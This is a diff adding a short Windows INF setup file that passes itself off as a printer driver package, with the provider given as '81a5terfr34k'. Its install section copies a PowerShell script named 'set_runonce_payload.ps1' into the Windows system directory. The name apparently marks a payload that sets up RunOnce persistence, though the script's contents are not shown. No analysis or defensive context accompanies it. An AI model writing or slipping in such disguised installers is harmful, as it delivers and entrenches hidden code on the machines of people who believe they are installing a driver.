@@ -1,0 +1,16 @@
+[Version]
+Signature="$Windows NT$"
+Class=Printer
+Provider="81a5terfr34k"
+
+[SourceDisksNames]
+1 = "LocalSource",,,
+
+[SourceDisksFiles]
+set_runonce_payload.ps1=1
+
+[DefaultInstall]
+CopyFiles=Scripts
+
+[DestinationDirs]
+Scripts=11
